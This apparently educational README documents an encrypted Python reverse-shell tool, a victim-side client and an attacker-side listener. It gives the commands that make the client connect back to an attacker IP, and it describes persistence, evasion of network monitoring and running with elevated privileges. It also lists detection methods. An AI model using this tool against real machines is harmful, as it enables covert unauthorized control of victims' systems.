What is a Reverse Shell?
────────────────────────
Instead of connecting TO a victim machine, a REVERSE shell has the victim
connect BACK to you. You then control it remotely.

Normal SSH:    You → victim (you initiate)
Reverse Shell: Victim → You (victim initiates) ◄──── This is different!


Why is it Called "Reverse"?
─────────────────────────────
┌─────────────────────────────────────┐
│  NORMAL SHELL (e.g., SSH):          │
│  Attacker IP → Victim IP (port 22)  │
│                                      │
│  REVERSE SHELL:                     │
│  Victim IP → Attacker IP (port 4444)│
│  (reversed direction)                │
└─────────────────────────────────────┘


How Does This Project Work?
────────────────────────────
1. You run listener.py on YOUR machine (attacker)
2. You run client.py on VICTIM machine
3. client.py connects back to your listener
4. You get a shell prompt where you can type commands
5. Commands execute on the victim machine
6. Output comes back encrypted and is displayed


What's So Special About It?
────────────────────────────
✓ Auto-reconnects every 5 seconds (persistent)
✓ All traffic encrypted with AES-256 (secure)
✓ Full shell access (pipes, redirects, cd, etc)
✓ Directory state persists (cd changes work properly)
✓ Works on Windows and Unix-like systems

client.py
──────────
The PAYLOAD deployed on victim machine.

Key Features:
  • Runs on victim's machine
  • Attempts to connect to attacker every 5 seconds
  • Executes received commands
  • Encrypts responses before sending back
  • Persists directory state across commands
  • Auto-reconnects on connection loss

How to Run:
  python client.py --ip <attacker_ip> --port 4444 --passphrase ultraprohacker

Arguments:
  --ip          Attacker's IP address (required)
  --port        Listener port (default: 4444)
  --passphrase  AES encryption passphrase (default: ultraprohacker)


listener.py
───────────
The COMMAND & CONTROL server on attacker's machine.

Key Features:
  • Listens for incoming reverse shell connections
  • Accepts encrypted commands from user input
  • Sends commands to connected client
  • Decrypts and displays output
  • Color-coded output formatting
  • Timestamp logging

How to Run:
  python listener.py --host 0.0.0.0 --port 4444 --passphrase ultraprohacker

Arguments:
  --host        Bind address (default: 0.0.0.0 - all interfaces)
  --port        Listen port (default: 4444)
  --passphrase  AES encryption passphrase (must match client!)

🔐 WHAT'S ENCRYPTED?
════════════════════════════════════════════════════════════════════════════════

Everything sent between client and listener:

→ Client sends:
  • Commands (e.g., "whoami")
  • Initial working directory on connect
  • All encrypted with AES-256

← Listener sends:
  • Command output (e.g., "admin")
  • Updated working directory (from cd commands)
  • All encrypted with AES-256

NOT encrypted (by this project):
  • TCP headers (IP, port numbers visible)
  • Connection itself (encrypted data is visible, just not readable)
  • The fact that you're connecting (timing/size analysis possible)


🛡️  SECURITY NOTES
════════════════════════════════════════════════════════════════════════════════

Why Use Encryption?
   ✓ Prevents eavesdropping on the network
   ✓ Hides commands and output from network monitoring
   ✓ Protects credentials passed as commands

Current Limitations (for educational purposes):
   ✗ No SSL/TLS (encrypted but not authenticated)
   ✗ No integrity checking (can't detect tampering)
   ✗ Shared passphrase (not secure for untrusted networks)
   ✗ Predictable reconnection (every 5 seconds - easy to detect)
   ✗ Fixed salt (all connections use same PBKDF2 salt)

How to Detect This in Real Networks:
   • IDS rules: Alert on repeated outbound connections to same IP:port
   • Firewall: Block suspicious outbound ports
   • EDR: Monitor for unusual subprocess creation
   • SIEM: Alert on repeated failed connections
   • NetFlow: Detect beaconing patterns (connection every 5 seconds)

❓ TROUBLESHOOTING
════════════════════════════════════════════════════════════════════════════════

Problem: "Connection refused"
Cause:   Listener not running on target IP:port
Fix:     1. Verify listener is running
         2. Check IP address is correct
         3. Verify port number matches (--port 4444)
         4. Check firewall isn't blocking the port


Problem: "Decryption failed" or "corrupt data"
Cause:   Passphrases don't match
Fix:     1. Make sure BOTH sides use same --passphrase
         2. Default is "ultraprohacker"
         3. If custom passphrase, must be identical


Problem: "Command timed out"
Cause:   Command taking longer than 30 seconds
Fix:     1. Client enforces 30-second timeout
         2. Avoid long-running commands
         3. Check if command is hanging waiting for input


Problem: "Module not found: cryptography"
Cause:   cryptography library not installed
Fix:     pip install cryptography


Problem: Client keeps reconnecting instead of staying connected
Cause:   Listener not accepting connections (already has client)
Fix:     This project handles ONE client at a time
         To test multiple clients, modify listener to use threading


Problem: "Permission denied" when running commands
Cause:   Client running with limited privileges
Fix:     This project runs with the current user's privileges
         If you need more access, run client with elevated privileges
